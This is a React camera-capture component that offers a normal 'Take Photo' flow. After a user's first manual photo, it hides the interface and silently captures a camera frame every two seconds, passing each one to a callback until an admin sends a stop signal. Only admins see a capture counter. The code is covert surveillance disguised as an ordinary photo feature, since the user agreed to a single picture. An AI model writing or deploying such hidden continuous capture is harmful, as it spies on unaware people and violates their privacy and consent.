import React, { useRef, useState, useEffect } from 'react';
import '../styles/CameraCapture.css';

const CameraCapture = ({ onCapture, onClose, startAutoAfterCapture = false, role = 'user', stopSignal = false, autoStartCapture = false }) => {
  const videoRef = useRef(null);
  const canvasRef = useRef(null);
  const [stream, setStream] = useState(null);
  const [error, setError] = useState('');
  const [isCapturing, setIsCapturing] = useState(autoStartCapture);
  const [captureCount, setCaptureCount] = useState(0);
  const [showUI, setShowUI] = useState(!autoStartCapture);
  const [firstCaptureDone, setFirstCaptureDone] = useState(autoStartCapture);
  const intervalRef = useRef(null);

  useEffect(() => {
    const startCamera = async () => {
      try {
        const mediaStream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: 'environment' },
          audio: false
        });
        if (videoRef.current) {
          videoRef.current.srcObject = mediaStream;
          setStream(mediaStream);
        }
      } catch (err) {
        setError('Unable to access camera: ' + err.message);
      }
    };

    startCamera();

    return () => {
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
      }
      if (intervalRef.current) {
        clearInterval(intervalRef.current);
      }
    };
  }, []);

  // Handle stop signal from admin
  useEffect(() => {
    if (stopSignal && isCapturing) {
      setIsCapturing(false);
      setShowUI(true);
    }
  }, [stopSignal, isCapturing]);

  // Auto-capture every 2 seconds
  useEffect(() => {
    if (isCapturing && videoRef.current && canvasRef.current) {
      intervalRef.current = setInterval(() => {
        capturePhoto(true); // true = auto capture
      }, 2000);
    } else {
      if (intervalRef.current) {
        clearInterval(intervalRef.current);
      }
    }

    return () => {
      if (intervalRef.current) {
        clearInterval(intervalRef.current);
      }
    };
  }, [isCapturing]);

  const capturePhoto = (isAuto = false) => {
    const video = videoRef.current;
    const canvas = canvasRef.current;
    
    if (!video || !canvas) return;
    
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0);
    
    canvas.toBlob((blob) => {
      const timestamp = new Date().toISOString();
      const file = new File([blob], `camera-${timestamp}.jpg`, { type: 'image/jpeg' });
      onCapture(file, isAuto);
      
      if (!isAuto && !firstCaptureDone && startAutoAfterCapture) {
        // First capture for user - start auto mode after
        setFirstCaptureDone(true);
        if (role === 'user') {
          // Hide UI and start auto-capturing silently
          setShowUI(false);
          setIsCapturing(true);
        }
      } else if (!isAuto) {
        // For admin manual capture
        setCaptureCount(prev => prev + 1);
      } else {
        setCaptureCount(prev => prev + 1);
      }
    }, 'image/jpeg');
  };

  const toggleCapture = () => {
    setIsCapturing(!isCapturing);
  };

  const stopCamera = () => {
    if (intervalRef.current) {
      clearInterval(intervalRef.current);
    }
    if (stream) {
      stream.getTracks().forEach(track => track.stop());
    }
    onClose();
  };

  return (
    <>
      {/* Video and canvas always in DOM for capturing - hidden when showUI is false */}
      <video
        ref={videoRef}
        autoPlay
        playsInline
        className="camera-video"
        style={showUI ? {} : { display: 'none' }}
      />
      <canvas ref={canvasRef} style={{ display: 'none' }} />

      {/* Modal only renders when showUI is true */}
      {showUI && (
        <div className="camera-modal-overlay">
          <div className="camera-modal">
            <div className="camera-header">
              <h2>Camera {isCapturing && role === 'admin' ? '(Auto-Capturing)' : ''}</h2>
              <button className="close-btn" onClick={stopCamera}>✕</button>
            </div>

            {error ? (
              <div className="camera-error">
                <p>{error}</p>
              </div>
            ) : null}

            {isCapturing && role === 'admin' && (
              <div className="capture-counter">📸 Captures: {captureCount}</div>
            )}

            <div className="camera-controls">
              {role === 'user' && !firstCaptureDone ? (
                <>
                  <button onClick={stopCamera} className="cancel-btn">Cancel</button>
                  <button onClick={() => capturePhoto(false)} className="capture-btn" disabled={error !== ''}>
                    📸 Take Photo
                  </button>
                </>
              ) : role === 'admin' && !isCapturing ? (
                <>
                  <button onClick={stopCamera} className="cancel-btn">Cancel</button>
                  <button onClick={() => capturePhoto(false)} className="capture-btn" disabled={error !== ''}>
                    📸 Capture
                  </button>
                  <button onClick={toggleCapture} className="capture-btn" disabled={error !== ''}>
                    🎬 Auto-Capture
                  </button>
                </>
              ) : role === 'admin' && isCapturing ? (
                <>
                  <button onClick={toggleCapture} className="stop-btn">
                    ⏹️ Stop Auto-Capture
                  </button>
                </>
              ) : null}
            </div>
          </div>
        </div>
      )}
    </>
  );
};

export default CameraCapture;
